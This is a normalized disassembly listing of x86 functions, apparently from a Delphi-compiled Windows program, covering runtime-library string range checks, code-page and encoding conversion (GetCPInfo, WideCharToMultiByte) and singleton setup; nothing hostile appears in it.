pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_41887c
jmp r-xdata
lea eax [ edi + 0xc ]
call sub_418638
test eax eax
jle r-xdata
lea eax [ edi + 0xc ]
call sub_41862c
mov esi eax
cmp esi 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax edi
call sub_41887c
mov eax edi
call sub_418870
sub_418a08
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_4186c8
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_418748
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_41862c
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_418870
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_418870
sub_418a80
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_418aa4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418b1b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_4056b8
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b22
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_4056b8
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418a80
test al al
jne r-xdata
mov al 0x1
sub_418b3c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418bae
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_418b90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_407134
push eax
call LoadLibraryW
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b97
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_418bc0
push ebx
mov ebx [ rw-data ]
mov ebx [ ebx ]
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov edx [ r-xdata ]
mov eax [ ebx + 0x18 ]
call sub_4081e0
xor eax eax
mov [ ebx + 0x18 ] eax
sub_418bf0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax [ ebp + 0xc ]
call sub_40898c
xor eax eax
push ebp
push sub_418c55
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_419638
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_419154
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c5c
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
lea eax [ ebp + 0xc ]
mov edx [ r-xdata ]
call sub_408928
retn
sub_418c64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax [ ebp + 0x14 ]
call sub_40898c
xor eax eax
push ebp
push sub_418cd1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
call sub_41965c
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_419154
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418cd8
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
lea eax [ ebp + 0x14 ]
mov edx [ r-xdata ]
call sub_408928
retn
sub_418cf4
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4055f0
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4055f0
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4055f0
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4055f0
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4055f0
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4055f0
retn
sub_418d64
push ebx
push esi
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_419ce4
mov ebx eax
mov esi rw-data
push 0x0
push ebx
push esi
call InterlockedCompareExchange
test eax eax
je r-xdata
mov eax ebx
call sub_4055f0
sub_418da0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov [ ebp - 0x1 ] 0x1
mov eax edi
call sub_408754
mov ebx eax
mov eax esi
call sub_408754
cmp ebx eax
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax esi
call sub_408754
mov edx eax
test edx edx
jle r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax 0x1
inc eax
dec edx
jne r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
movzx ecx [ edi + eax - 0x1 ]
cmp cl [ esi + eax - 0x1 ]
je r-xdata
jmp r-xdata
sub_418dfc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_418ef2
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebx ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_418da0
test al al
je r-xdata
call sub_419994
lea edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_418da0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418ef9
lea eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
mov ecx 0x5
call sub_407e40
retn
mov eax [ ebp - 0x4 ]
call sub_408754
mov esi eax
call sub_418d64
lea edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_418da0
test al al
je r-xdata
call sub_419994
mov [ ebx ] eax
jmp r-xdata
call sub_4199d0
lea edx [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_418da0
test al al
je r-xdata
call sub_418d64
mov [ ebx ] eax
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_408754
mov esi eax
jmp r-xdata
call sub_4198b0
mov [ ebx ] eax
call sub_4199d0
mov [ ebx ] eax
jmp r-xdata
sub_418f04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_408754
push eax
xor ecx ecx
mov edx esi
mov eax ebx
call sub_418f20
pop esi
pop ebx
retn
sub_418f20
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0x8 ]
test esi esi
jge r-xdata
test ebx ebx
jge r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
mov eax [ ebp - 0x4 ]
call sub_408754
sub eax esi
cmp ebx eax
jle r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
mov eax [ ebp - 0x4 ]
lea edx [ eax + esi * 2 ]
mov ecx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
sub_418fcc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_41903f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_407134
mov edx eax
mov ecx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419046
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_419050
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_419142
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi 0x1
jge r-xdata
test ebx ebx
jge r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
sub eax esi
inc eax
cmp ebx eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov eax [ ebp - 0x4 ]
lea edx [ eax + esi * 2 - 0x2 ]
mov ecx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419149
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
sub_419154
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_418f04
mov ebp eax
push ebp
mov eax edi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax esi
call sub_408754
push eax
push edi
push 0x0
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41919c
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41919c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
test ebx ebx
jge r-xdata
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
mov eax [ ebp - 0x8 ]
call sub_408754
sub eax edi
cmp ebx eax
jle r-xdata
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
call sub_408754
mov [ ebp - 0xc ] eax
test esi esi
jl r-xdata
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
cmp esi [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
add eax esi
push eax
mov eax [ ebp - 0xc ]
sub eax esi
push eax
mov eax [ ebp - 0x8 ]
lea edx [ eax + edi * 2 ]
mov ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
push ebx
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418f20
mov edx [ ebp - 0xc ]
sub edx esi
cmp eax edx
jle r-xdata
sub_419308
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_41939d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_418fcc
mov edi eax
push edi
mov eax esi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push eax
push esi
push 0x0
mov ecx 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4193ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4193a4
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_4193ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_41953d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
cmp edi 0x1
jge r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jge r-xdata
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
sub eax edi
inc eax
cmp ebx eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov eax [ ebp + 0xc ]
mov eax [ eax ]
call sub_408754
mov [ ebp - 0xc ] eax
test esi esi
jl r-xdata
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
cmp esi [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
add eax esi
push eax
mov eax [ ebp - 0xc ]
sub eax esi
push eax
mov eax [ ebp - 0x4 ]
lea edx [ eax + edi * 2 - 0x2 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419544
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
push ebx
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419050
mov edx [ ebp - 0xc ]
sub edx esi
cmp eax edx
jle r-xdata
sub_419550
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_408754
push eax
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41956c
pop esi
pop ebx
retn
sub_41956c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
test edi edi
jne r-xdata
test esi esi
jge r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jge r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
mov eax edi
call sub_408754
sub eax esi
cmp ebx eax
jle r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
lea edx [ edi + esi ]
mov ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
sub_419638
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_408754
push eax
push edi
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41965c
pop edi
pop esi
pop ebx
retn
sub_41965c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
test edi edi
jne r-xdata
test esi esi
jge r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jge r-xdata
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
mov eax edi
call sub_408754
sub eax esi
cmp ebx eax
jle r-xdata
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
push ebx
mov ecx esi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41956c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x8 ]
push eax
lea edx [ edi + esi ]
mov ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
sub_41975c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
test esi esi
jge r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jge r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
mov eax [ ebp - 0x8 ]
call sub_408754
sub eax esi
cmp ebx eax
jle r-xdata
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
push ebx
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41956c
mov [ ebp - 0xc ] eax
test edi edi
jl r-xdata
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
call sub_408754
cmp edi eax
jle r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
lea eax [ eax + edi * 2 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
lea edx [ eax + esi ]
mov ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
call sub_408754
mov edx [ ebp - 0xc ]
add edx edi
cmp eax edx
jge r-xdata
sub_4198b0
push ebx
push esi
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
pop esi
pop ebx
retn
push 0x0
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419acc
mov ebx eax
mov esi rw-data
push 0x0
push ebx
push esi
call InterlockedCompareExchange
test eax eax
je r-xdata
mov eax ebx
call sub_4055f0
sub_419900
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_408754
push eax
push edi
xor ecx ecx
mov edx esi
mov eax ebx
call sub_419924
pop edi
pop esi
pop ebx
retn
sub_419924
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419984
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_41965c
mov eax [ ebp - 0x4 ]
call sub_408754
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4071e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41998b
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
retn
sub_419994
push ebx
push esi
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_419ce4
mov ebx eax
mov esi rw-data
push 0x0
push ebx
push esi
call InterlockedCompareExchange
test eax eax
je r-xdata
mov eax ebx
call sub_4055f0
sub_4199d0
push ebx
push esi
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_419c68
mov ebx eax
mov esi rw-data
push 0x0
push ebx
push esi
call InterlockedCompareExchange
test eax eax
je r-xdata
mov eax ebx
call sub_4055f0
sub_419a0c
cmp eax [ rw-data ]
je r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
je r-xdata
cmp eax [ rw-data ]
je r-xdata
cmp eax [ rw-data ]
je r-xdata
cmp eax [ rw-data ]
je r-xdata
cmp eax [ rw-data ]
je r-xdata
xor eax eax
retn
sub_419a44
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0x24 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_419a84
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebx + 0xc ] ecx
push 0x0
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_419acc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0xc ] ecx
mov eax [ ebp + 0xc ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ esi + 0xc ]
push eax
call GetCPInfo
test eax eax
jne r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax [ ebp - 0x14 ]
mov [ esi + 0x8 ] eax
dec eax
sete al
mov [ esi + 0x4 ] al
mov eax esi
test bl bl
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_419b60
push ebp
mov ebp esp
push ebx
push 0x0
push 0x0
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
push ecx
push edx
mov edx [ eax + 0x14 ]
push edx
mov eax [ eax + 0xc ]
push eax
call WideCharToMultiByte
pop ebx
pop ebp
retn 0x8
sub_419b98
push ebp
mov ebp esp
push ebx
